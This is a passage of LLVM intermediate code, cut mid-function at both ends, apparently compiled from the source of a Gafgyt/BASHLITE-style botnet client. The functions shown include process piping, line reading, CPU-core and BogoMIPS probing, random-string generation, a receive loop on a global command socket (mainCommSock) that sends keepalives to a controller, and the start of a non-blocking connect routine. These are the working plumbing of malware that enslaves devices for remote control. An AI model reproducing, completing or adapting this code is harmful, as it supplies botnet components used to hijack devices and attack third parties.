  br label %116

; <label>:116:                                    ; preds = %110, %104
  %117 = load i32, i32* %9, align 4
  %118 = load i32*, i32** @fdopen_pids, align 8
  %119 = load i32, i32* %6, align 4
  %120 = sext i32 %119 to i64
  %121 = getelementptr inbounds i32, i32* %118, i64 %120
  store i32 %117, i32* %121, align 4
  %122 = load i32, i32* %6, align 4
  store i32 %122, i32* %3, align 4
  br label %123

; <label>:123:                                    ; preds = %116, %56, %47, %37, %30, %25
  %124 = load i32, i32* %3, align 4
  ret i32 %124
}

; Function Attrs: nounwind
declare i32 @pipe(i32*) #4

; Function Attrs: nounwind
declare i32 @getdtablesize() #4

; Function Attrs: nounwind returns_twice
declare i32 @vfork() #6

declare i32 @close(i32) #3

; Function Attrs: nounwind
declare i32 @dup2(i32, i32) #4

; Function Attrs: noreturn
declare void @_exit(i32) #7

; Function Attrs: noinline nounwind uwtable
define i32 @fdpclose(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.__sigset_t, align 8
  %6 = alloca %struct.__sigset_t, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.in_addr, align 4
  store i32 %0, i32* %3, align 4
  %10 = load i32*, i32** @fdopen_pids, align 8
  %11 = icmp eq i32* %10, null
  br i1 %11, label %19, label %12

; <label>:12:                                     ; preds = %1
  %13 = load i32*, i32** @fdopen_pids, align 8
  %14 = load i32, i32* %3, align 4
  %15 = sext i32 %14 to i64
  %16 = getelementptr inbounds i32, i32* %13, i64 %15
  %17 = load i32, i32* %16, align 4
  %18 = icmp eq i32 %17, 0
  br i1 %18, label %19, label %20

; <label>:19:                                     ; preds = %12, %1
  store i32 -1, i32* %2, align 4
  br label %62

; <label>:20:                                     ; preds = %12
  %21 = load i32, i32* %3, align 4
  %22 = call i32 @close(i32 %21)
  %23 = call i32 @sigemptyset(%struct.__sigset_t* %6) #2
  %24 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 2) #2
  %25 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 3) #2
  %26 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 1) #2
  %27 = call i32 @sigprocmask(i32 0, %struct.__sigset_t* %6, %struct.__sigset_t* %5) #2
  br label %28

; <label>:28:                                     ; preds = %42, %20
  %29 = load i32*, i32** @fdopen_pids, align 8
  %30 = load i32, i32* %3, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds i32, i32* %29, i64 %31
  %33 = load i32, i32* %32, align 4
  %34 = call i32 @waitpid(i32 %33, i32* %7, i32 0)
  store i32 %34, i32* %8, align 4
  br label %35

; <label>:35:                                     ; preds = %28
  %36 = load i32, i32* %8, align 4
  %37 = icmp eq i32 %36, -1
  br i1 %37, label %38, label %42

; <label>:38:                                     ; preds = %35
  %39 = call i32* @__errno_location() #13
  %40 = load i32, i32* %39, align 4
  %41 = icmp eq i32 %40, 4
  br label %42

; <label>:42:                                     ; preds = %38, %35
  %43 = phi i1 [ false, %35 ], [ %41, %38 ]
  br i1 %43, label %28, label %44

; <label>:44:                                     ; preds = %42
  %45 = call i32 @sigprocmask(i32 2, %struct.__sigset_t* %5, %struct.__sigset_t* null) #2
  %46 = load i32*, i32** @fdopen_pids, align 8
  %47 = load i32, i32* %4, align 4
  %48 = sext i32 %47 to i64
  %49 = getelementptr inbounds i32, i32* %46, i64 %48
  store i32 0, i32* %49, align 4
  %50 = load i32, i32* %8, align 4
  %51 = icmp eq i32 %50, -1
  br i1 %51, label %52, label %53

; <label>:52:                                     ; preds = %44
  br label %60

; <label>:53:                                     ; preds = %44
  %54 = bitcast %struct.in_addr* %9 to i32*
  %55 = load i32, i32* %7, align 4
  store i32 %55, i32* %54, align 4
  %56 = bitcast %struct.in_addr* %9 to i32*
  %57 = load i32, i32* %56, align 4
  %58 = and i32 %57, 65280
  %59 = ashr i32 %58, 8
  br label %60

; <label>:60:                                     ; preds = %53, %52
  %61 = phi i32 [ -1, %52 ], [ %59, %53 ]
  store i32 %61, i32* %2, align 4
  br label %62

; <label>:62:                                     ; preds = %60, %19
  %63 = load i32, i32* %2, align 4
  ret i32 %63
}

; Function Attrs: nounwind
declare i32 @sigemptyset(%struct.__sigset_t*) #4

; Function Attrs: nounwind
declare i32 @sigaddset(%struct.__sigset_t*, i32) #4

; Function Attrs: nounwind
declare i32 @sigprocmask(i32, %struct.__sigset_t*, %struct.__sigset_t*) #4

declare i32 @waitpid(i32, i32*, i32) #3

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #8

; Function Attrs: noinline nounwind uwtable
define i8* @fdgets(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  store i32 1, i32* %7, align 4
  store i32 0, i32* %8, align 4
  br label %9

; <label>:9:                                      ; preds = %27, %3
  %10 = load i32, i32* %7, align 4
  %11 = icmp eq i32 %10, 1
  br i1 %11, label %12, label %25

; <label>:12:                                     ; preds = %9
  %13 = load i32, i32* %8, align 4
  %14 = load i32, i32* %5, align 4
  %15 = icmp slt i32 %13, %14
  br i1 %15, label %16, label %25

; <label>:16:                                     ; preds = %12
  %17 = load i8*, i8** %4, align 8
  %18 = load i32, i32* %8, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds i8, i8* %17, i64 %19
  %21 = getelementptr inbounds i8, i8* %20, i64 -1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 10
  br label %25

; <label>:25:                                     ; preds = %16, %12, %9
  %26 = phi i1 [ false, %12 ], [ false, %9 ], [ %24, %16 ]
  br i1 %26, label %27, label %37

; <label>:27:                                     ; preds = %25
  %28 = load i32, i32* %6, align 4
  %29 = load i8*, i8** %4, align 8
  %30 = load i32, i32* %8, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds i8, i8* %29, i64 %31
  %33 = call i64 @read(i32 %28, i8* %32, i64 1)
  %34 = trunc i64 %33 to i32
  store i32 %34, i32* %7, align 4
  %35 = load i32, i32* %8, align 4
  %36 = add nsw i32 %35, 1
  store i32 %36, i32* %8, align 4
  br label %9

; <label>:37:                                     ; preds = %25
  %38 = load i32, i32* %7, align 4
  %39 = icmp eq i32 %38, 0
  br i1 %39, label %40, label %41

; <label>:40:                                     ; preds = %37
  br label %43

; <label>:41:                                     ; preds = %37
  %42 = load i8*, i8** %4, align 8
  br label %43

; <label>:43:                                     ; preds = %41, %40
  %44 = phi i8* [ null, %40 ], [ %42, %41 ]
  ret i8* %44
}

declare i64 @read(i32, i8*, i64) #3

; Function Attrs: noinline nounwind uwtable
define i64 @parseHex(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i64, align 8
  store i8* %0, i8** %2, align 8
  store i64 0, i64* %3, align 8
  br label %4

; <label>:4:                                      ; preds = %14, %1
  %5 = load i8*, i8** %2, align 8
  %6 = load i8, i8* %5, align 1
  %7 = zext i8 %6 to i32
  %8 = icmp ne i32 %7, 0
  br i1 %8, label %9, label %12

; <label>:9:                                      ; preds = %4
  %10 = load i64, i64* %3, align 8
  %11 = icmp sge i64 %10, 0
  br label %12

; <label>:12:                                     ; preds = %9, %4
  %13 = phi i1 [ false, %4 ], [ %11, %9 ]
  br i1 %13, label %14, label %24

; <label>:14:                                     ; preds = %12
  %15 = load i64, i64* %3, align 8
  %16 = shl i64 %15, 4
  %17 = load i8*, i8** %2, align 8
  %18 = getelementptr inbounds i8, i8* %17, i32 1
  store i8* %18, i8** %2, align 8
  %19 = load i8, i8* %17, align 1
  %20 = zext i8 %19 to i64
  %21 = getelementptr inbounds [256 x i64], [256 x i64]* @hextable, i64 0, i64 %20
  %22 = load i64, i64* %21, align 8
  %23 = or i64 %16, %22
  store i64 %23, i64* %3, align 8
  br label %4

; <label>:24:                                     ; preds = %12
  %25 = load i64, i64* %3, align 8
  ret i64 %25
}

; Function Attrs: noinline nounwind uwtable
define i32 @wildString(i8*, i8*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %6 = load i8*, i8** %4, align 8
  %7 = load i8, i8* %6, align 1
  %8 = zext i8 %7 to i32
  switch i32 %8, label %54 [
    i32 0, label %9
    i32 42, label %13
    i32 63, label %37
  ]

; <label>:9:                                      ; preds = %2
  %10 = load i8*, i8** %5, align 8
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  store i32 %12, i32* %3, align 4
  br label %76

; <label>:13:                                     ; preds = %2
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds i8, i8* %14, i64 1
  %16 = load i8*, i8** %5, align 8
  %17 = call i32 @wildString(i8* %15, i8* %16)
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %33

; <label>:19:                                     ; preds = %13
  %20 = load i8*, i8** %5, align 8
  %21 = load i8, i8* %20, align 1
  %22 = zext i8 %21 to i32
  %23 = icmp ne i32 %22, 0
  br i1 %23, label %24, label %31

; <label>:24:                                     ; preds = %19
  %25 = load i8*, i8** %4, align 8
  %26 = load i8*, i8** %5, align 8
  %27 = getelementptr inbounds i8, i8* %26, i64 1
  %28 = call i32 @wildString(i8* %25, i8* %27)
  %29 = icmp ne i32 %28, 0
  %30 = xor i1 %29, true
  br label %31

; <label>:31:                                     ; preds = %24, %19
  %32 = phi i1 [ false, %19 ], [ %30, %24 ]
  br label %33

; <label>:33:                                     ; preds = %31, %13
  %34 = phi i1 [ true, %13 ], [ %32, %31 ]
  %35 = xor i1 %34, true
  %36 = zext i1 %35 to i32
  store i32 %36, i32* %3, align 4
  br label %76

; <label>:37:                                     ; preds = %2
  %38 = load i8*, i8** %5, align 8
  %39 = load i8, i8* %38, align 1
  %40 = zext i8 %39 to i32
  %41 = icmp ne i32 %40, 0
  br i1 %41, label %42, label %50

; <label>:42:                                     ; preds = %37
  %43 = load i8*, i8** %4, align 8
  %44 = getelementptr inbounds i8, i8* %43, i64 1
  %45 = load i8*, i8** %5, align 8
  %46 = getelementptr inbounds i8, i8* %45, i64 1
  %47 = call i32 @wildString(i8* %44, i8* %46)
  %48 = icmp ne i32 %47, 0
  %49 = xor i1 %48, true
  br label %50

; <label>:50:                                     ; preds = %42, %37
  %51 = phi i1 [ false, %37 ], [ %49, %42 ]
  %52 = xor i1 %51, true
  %53 = zext i1 %52 to i32
  store i32 %53, i32* %3, align 4
  br label %76

; <label>:54:                                     ; preds = %2
  %55 = load i8*, i8** %4, align 8
  %56 = load i8, i8* %55, align 1
  %57 = zext i8 %56 to i32
  %58 = call i32 @toupper(i32 %57) #10
  %59 = load i8*, i8** %5, align 8
  %60 = load i8, i8* %59, align 1
  %61 = zext i8 %60 to i32
  %62 = call i32 @toupper(i32 %61) #10
  %63 = icmp eq i32 %58, %62
  br i1 %63, label %64, label %72

; <label>:64:                                     ; preds = %54
  %65 = load i8*, i8** %4, align 8
  %66 = getelementptr inbounds i8, i8* %65, i64 1
  %67 = load i8*, i8** %5, align 8
  %68 = getelementptr inbounds i8, i8* %67, i64 1
  %69 = call i32 @wildString(i8* %66, i8* %68)
  %70 = icmp ne i32 %69, 0
  %71 = xor i1 %70, true
  br label %72

; <label>:72:                                     ; preds = %64, %54
  %73 = phi i1 [ false, %54 ], [ %71, %64 ]
  %74 = xor i1 %73, true
  %75 = zext i1 %74 to i32
  store i32 %75, i32* %3, align 4
  br label %76

; <label>:76:                                     ; preds = %72, %50, %33, %9
  %77 = load i32, i32* %3, align 4
  ret i32 %77
}

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca %struct.in_addr*, align 8
  %6 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %4, align 8
  store %struct.in_addr* %1, %struct.in_addr** %5, align 8
  %7 = load i8*, i8** %4, align 8
  %8 = call i32 @inet_addr(i8* %7) #2
  %9 = load %struct.in_addr*, %struct.in_addr** %5, align 8
  %10 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %9, i32 0, i32 0
  store i32 %8, i32* %10, align 4
  %11 = icmp eq i32 %8, -1
  br i1 %11, label %12, label %13

; <label>:12:                                     ; preds = %2
  store i32 1, i32* %3, align 4
  br label %14

; <label>:13:                                     ; preds = %2
  store i32 0, i32* %3, align 4
  br label %14

; <label>:14:                                     ; preds = %13, %12
  %15 = load i32, i32* %3, align 4
  ret i32 %15
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @uppercase(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  br label %3

; <label>:3:                                      ; preds = %7, %1
  %4 = load i8*, i8** %2, align 8
  %5 = load i8, i8* %4, align 1
  %6 = icmp ne i8 %5, 0
  br i1 %6, label %7, label %16

; <label>:7:                                      ; preds = %3
  %8 = load i8*, i8** %2, align 8
  %9 = load i8, i8* %8, align 1
  %10 = zext i8 %9 to i32
  %11 = call i32 @toupper(i32 %10) #10
  %12 = trunc i32 %11 to i8
  %13 = load i8*, i8** %2, align 8
  store i8 %12, i8* %13, align 1
  %14 = load i8*, i8** %2, align 8
  %15 = getelementptr inbounds i8, i8* %14, i32 1
  store i8* %15, i8** %2, align 8
  br label %3

; <label>:16:                                     ; preds = %3
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @getBogos(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca [4096 x i8], align 16
  %6 = alloca i8*, align 8
  store i8* %0, i8** %3, align 8
  %7 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.20, i32 0, i32 0), i32 0)
  store i32 %7, i32* %4, align 4
  br label %8

; <label>:8:                                      ; preds = %82, %1
  %9 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %10 = load i32, i32* %4, align 4
  %11 = call i8* @fdgets(i8* %9, i32 4096, i32 %10)
  %12 = icmp ne i8* %11, null
  br i1 %12, label %13, label %84

; <label>:13:                                     ; preds = %8
  %14 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  call void @uppercase(i8* %14)
  %15 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %16 = call i8* @strstr(i8* %15, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.21, i32 0, i32 0)) #10
  %17 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %18 = icmp eq i8* %16, %17
  br i1 %18, label %19, label %82

; <label>:19:                                     ; preds = %13
  %20 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %21 = getelementptr inbounds i8, i8* %20, i64 8
  store i8* %21, i8** %6, align 8
  br label %22

; <label>:22:                                     ; preds = %39, %19
  %23 = load i8*, i8** %6, align 8
  %24 = load i8, i8* %23, align 1
  %25 = zext i8 %24 to i32
  %26 = icmp eq i32 %25, 32
  br i1 %26, label %37, label %27

; <label>:27:                                     ; preds = %22
  %28 = load i8*, i8** %6, align 8
  %29 = load i8, i8* %28, align 1
  %30 = zext i8 %29 to i32
  %31 = icmp eq i32 %30, 9
  br i1 %31, label %37, label %32

; <label>:32:                                     ; preds = %27
  %33 = load i8*, i8** %6, align 8
  %34 = load i8, i8* %33, align 1
  %35 = zext i8 %34 to i32
  %36 = icmp eq i32 %35, 58
  br label %37

; <label>:37:                                     ; preds = %32, %27, %22
  %38 = phi i1 [ true, %27 ], [ true, %22 ], [ %36, %32 ]
  br i1 %38, label %39, label %42

; <label>:39:                                     ; preds = %37
  %40 = load i8*, i8** %6, align 8
  %41 = getelementptr inbounds i8, i8* %40, i32 1
  store i8* %41, i8** %6, align 8
  br label %22

; <label>:42:                                     ; preds = %37
  br label %43

; <label>:43:                                     ; preds = %63, %42
  %44 = load i8*, i8** %6, align 8
  %45 = load i8*, i8** %6, align 8
  %46 = call i64 @strlen(i8* %45) #10
  %47 = sub i64 %46, 1
  %48 = getelementptr inbounds i8, i8* %44, i64 %47
  %49 = load i8, i8* %48, align 1
  %50 = zext i8 %49 to i32
  %51 = icmp eq i32 %50, 13
  br i1 %51, label %61, label %52

; <label>:52:                                     ; preds = %43
  %53 = load i8*, i8** %6, align 8
  %54 = load i8*, i8** %6, align 8
  %55 = call i64 @strlen(i8* %54) #10
  %56 = sub i64 %55, 1
  %57 = getelementptr inbounds i8, i8* %53, i64 %56
  %58 = load i8, i8* %57, align 1
  %59 = zext i8 %58 to i32
  %60 = icmp eq i32 %59, 10
  br label %61

; <label>:61:                                     ; preds = %52, %43
  %62 = phi i1 [ true, %43 ], [ %60, %52 ]
  br i1 %62, label %63, label %69

; <label>:63:                                     ; preds = %61
  %64 = load i8*, i8** %6, align 8
  %65 = load i8*, i8** %6, align 8
  %66 = call i64 @strlen(i8* %65) #10
  %67 = sub i64 %66, 1
  %68 = getelementptr inbounds i8, i8* %64, i64 %67
  store i8 0, i8* %68, align 1
  br label %43

; <label>:69:                                     ; preds = %61
  %70 = load i8*, i8** %6, align 8
  %71 = call i8* @strchr(i8* %70, i32 46) #10
  %72 = icmp ne i8* %71, null
  br i1 %72, label %73, label %76

; <label>:73:                                     ; preds = %69
  %74 = load i8*, i8** %6, align 8
  %75 = call i8* @strchr(i8* %74, i32 46) #10
  store i8 0, i8* %75, align 1
  br label %76

; <label>:76:                                     ; preds = %73, %69
  %77 = load i8*, i8** %3, align 8
  %78 = load i8*, i8** %6, align 8
  %79 = call i8* @strcpy(i8* %77, i8* %78) #2
  %80 = load i32, i32* %4, align 4
  %81 = call i32 @close(i32 %80)
  store i32 0, i32* %2, align 4
  br label %87

; <label>:82:                                     ; preds = %13
  %83 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %83, i8 0, i64 4096, i32 16, i1 false)
  br label %8

; <label>:84:                                     ; preds = %8
  %85 = load i32, i32* %4, align 4
  %86 = call i32 @close(i32 %85)
  store i32 1, i32* %2, align 4
  br label %87

; <label>:87:                                     ; preds = %84, %76
  %88 = load i32, i32* %2, align 4
  ret i32 %88
}

declare i32 @open(i8*, i32, ...) #3

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8*) #1

; Function Attrs: nounwind readonly
declare i8* @strchr(i8*, i32) #1

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @getCores() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca [4096 x i8], align 16
  store i32 0, i32* %1, align 4
  %4 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.20, i32 0, i32 0), i32 0)
  store i32 %4, i32* %2, align 4
  br label %5

; <label>:5:                                      ; preds = %19, %0
  %6 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  %7 = load i32, i32* %2, align 4
  %8 = call i8* @fdgets(i8* %6, i32 4096, i32 %7)
  %9 = icmp ne i8* %8, null
  br i1 %9, label %10, label %21

; <label>:10:                                     ; preds = %5
  %11 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  call void @uppercase(i8* %11)
  %12 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  %13 = call i8* @strstr(i8* %12, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.21, i32 0, i32 0)) #10
  %14 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  %15 = icmp eq i8* %13, %14
  br i1 %15, label %16, label %19

; <label>:16:                                     ; preds = %10
  %17 = load i32, i32* %1, align 4
  %18 = add nsw i32 %17, 1
  store i32 %18, i32* %1, align 4
  br label %19

; <label>:19:                                     ; preds = %16, %10
  %20 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %20, i8 0, i64 4096, i32 16, i1 false)
  br label %5

; <label>:21:                                     ; preds = %5
  %22 = load i32, i32* %2, align 4
  %23 = call i32 @close(i32 %22)
  %24 = load i32, i32* %1, align 4
  ret i32 %24
}

; Function Attrs: noinline nounwind uwtable
define void @makeRandomStr(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store i32 0, i32* %5, align 4
  br label %6

; <label>:6:                                      ; preds = %19, %2
  %7 = load i32, i32* %5, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp slt i32 %7, %8
  br i1 %9, label %10, label %22

; <label>:10:                                     ; preds = %6
  %11 = call i32 @rand_cmwc()
  %12 = urem i32 %11, 26
  %13 = add i32 %12, 65
  %14 = trunc i32 %13 to i8
  %15 = load i8*, i8** %3, align 8
  %16 = load i32, i32* %5, align 4
  %17 = sext i32 %16 to i64
  %18 = getelementptr inbounds i8, i8* %15, i64 %17
  store i8 %14, i8* %18, align 1
  br label %19

; <label>:19:                                     ; preds = %10
  %20 = load i32, i32* %5, align 4
  %21 = add nsw i32 %20, 1
  store i32 %21, i32* %5, align 4
  br label %6

; <label>:22:                                     ; preds = %6
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @recvLine(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca %struct.__sigset_t, align 8
  %9 = alloca %struct.timeval, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8, align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %19 = load i8*, i8** %6, align 8
  %20 = load i32, i32* %7, align 4
  %21 = sext i32 %20 to i64
  call void @llvm.memset.p0i8.i64(i8* %19, i8 0, i64 %21, i32 1, i1 false)
  %22 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %22, align 8
  %23 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %23, align 8
  br label %24

; <label>:24:                                     ; preds = %3
  %25 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %26 = getelementptr inbounds [16 x i64], [16 x i64]* %25, i64 0, i64 0
  %27 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %26) #2, !srcloc !1
  %28 = extractvalue { i64, i64* } %27, 0
  %29 = extractvalue { i64, i64* } %27, 1
  %30 = trunc i64 %28 to i32
  store i32 %30, i32* %10, align 4
  %31 = ptrtoint i64* %29 to i64
  %32 = trunc i64 %31 to i32
  store i32 %32, i32* %11, align 4
  br label %33

; <label>:33:                                     ; preds = %24
  %34 = load i32, i32* %5, align 4
  %35 = srem i32 %34, 64
  %36 = zext i32 %35 to i64
  %37 = shl i64 1, %36
  %38 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %39 = load i32, i32* %5, align 4
  %40 = sdiv i32 %39, 64
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds [16 x i64], [16 x i64]* %38, i64 0, i64 %41
  %43 = load i64, i64* %42, align 8
  %44 = or i64 %43, %37
  store i64 %44, i64* %42, align 8
  %45 = load i32, i32* %5, align 4
  %46 = add nsw i32 %45, 1
  %47 = call i32 @select(i32 %46, %struct.__sigset_t* %8, %struct.__sigset_t* null, %struct.__sigset_t* %8, %struct.timeval* %9)
  store i32 %47, i32* %12, align 4
  %48 = icmp sle i32 %47, 0
  br i1 %48, label %49, label %88

; <label>:49:                                     ; preds = %33
  br label %50

; <label>:50:                                     ; preds = %83, %49
  %51 = load i32, i32* %13, align 4
  %52 = icmp slt i32 %51, 10
  br i1 %52, label %53, label %87

; <label>:53:                                     ; preds = %50
  %54 = load i32, i32* @mainCommSock, align 4
  %55 = call i32 (i32, i8*, ...) @sockprintf(i32 %54, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.22, i32 0, i32 0))
  %56 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %56, align 8
  %57 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %57, align 8
  br label %58

; <label>:58:                                     ; preds = %53
  %59 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %60 = getelementptr inbounds [16 x i64], [16 x i64]* %59, i64 0, i64 0
  %61 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %60) #2, !srcloc !2
  %62 = extractvalue { i64, i64* } %61, 0
  %63 = extractvalue { i64, i64* } %61, 1
  %64 = trunc i64 %62 to i32
  store i32 %64, i32* %14, align 4
  %65 = ptrtoint i64* %63 to i64
  %66 = trunc i64 %65 to i32
  store i32 %66, i32* %15, align 4
  br label %67

; <label>:67:                                     ; preds = %58
  %68 = load i32, i32* %5, align 4
  %69 = srem i32 %68, 64
  %70 = zext i32 %69 to i64
  %71 = shl i64 1, %70
  %72 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %73 = load i32, i32* %5, align 4
  %74 = sdiv i32 %73, 64
  %75 = sext i32 %74 to i64
  %76 = getelementptr inbounds [16 x i64], [16 x i64]* %72, i64 0, i64 %75
  %77 = load i64, i64* %76, align 8
  %78 = or i64 %77, %71
  store i64 %78, i64* %76, align 8
  %79 = load i32, i32* %5, align 4
  %80 = add nsw i32 %79, 1
  %81 = call i32 @select(i32 %80, %struct.__sigset_t* %8, %struct.__sigset_t* null, %struct.__sigset_t* %8, %struct.timeval* %9)
  store i32 %81, i32* %12, align 4
  %82 = icmp sle i32 %81, 0
  br i1 %82, label %83, label %86

; <label>:83:                                     ; preds = %67
  %84 = load i32, i32* %13, align 4
  %85 = add nsw i32 %84, 1
  store i32 %85, i32* %13, align 4
  br label %50

; <label>:86:                                     ; preds = %67
  br label %87

; <label>:87:                                     ; preds = %86, %50
  br label %88

; <label>:88:                                     ; preds = %87, %33
  store i32 0, i32* %18, align 4
  %89 = load i8*, i8** %6, align 8
  store i8* %89, i8** %17, align 8
  br label %90

; <label>:90:                                     ; preds = %108, %88
  %91 = load i32, i32* %7, align 4
  %92 = add nsw i32 %91, -1
  store i32 %92, i32* %7, align 4
  %93 = icmp sgt i32 %91, 1
  br i1 %93, label %94, label %111

; <label>:94:                                     ; preds = %90
  %95 = load i32, i32* @mainCommSock, align 4
  %96 = call i64 @recv(i32 %95, i8* %16, i64 1, i32 0)
  %97 = icmp ne i64 %96, 1
  br i1 %97, label %98, label %100

; <label>:98:                                     ; preds = %94
  %99 = load i8*, i8** %17, align 8
  store i8 0, i8* %99, align 1
  store i32 -1, i32* %4, align 4
  br label %114

; <label>:100:                                    ; preds = %94
  %101 = load i8, i8* %16, align 1
  %102 = load i8*, i8** %17, align 8
  %103 = getelementptr inbounds i8, i8* %102, i32 1
  store i8* %103, i8** %17, align 8
  store i8 %101, i8* %102, align 1
  %104 = load i8, i8* %16, align 1
  %105 = zext i8 %104 to i32
  %106 = icmp eq i32 %105, 10
  br i1 %106, label %107, label %108

; <label>:107:                                    ; preds = %100
  br label %111

; <label>:108:                                    ; preds = %100
  %109 = load i32, i32* %18, align 4
  %110 = add nsw i32 %109, 1
  store i32 %110, i32* %18, align 4
  br label %90

; <label>:111:                                    ; preds = %107, %90
  %112 = load i8*, i8** %17, align 8
  store i8 0, i8* %112, align 1
  %113 = load i32, i32* %18, align 4
  store i32 %113, i32* %4, align 4
  br label %114

; <label>:114:                                    ; preds = %111, %98
  %115 = load i32, i32* %4, align 4
  ret i32 %115
}

declare i32 @select(i32, %struct.__sigset_t*, %struct.__sigset_t*, %struct.__sigset_t*, %struct.timeval*) #3

declare i64 @recv(i32, i8*, i64, i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca %struct.__sigset_t, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i64, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i8* %1, i8** %7, align 8
  store i32 %2, i32* %8, align 4
  store i32 %3, i32* %9, align 4
  %19 = load i32, i32* %6, align 4
  %20 = call i32 (i32, i32, ...) @fcntl(i32 %19, i32 3, i8* null)
  %21 = sext i32 %20 to i64
  store i64 %21, i64* %15, align 8
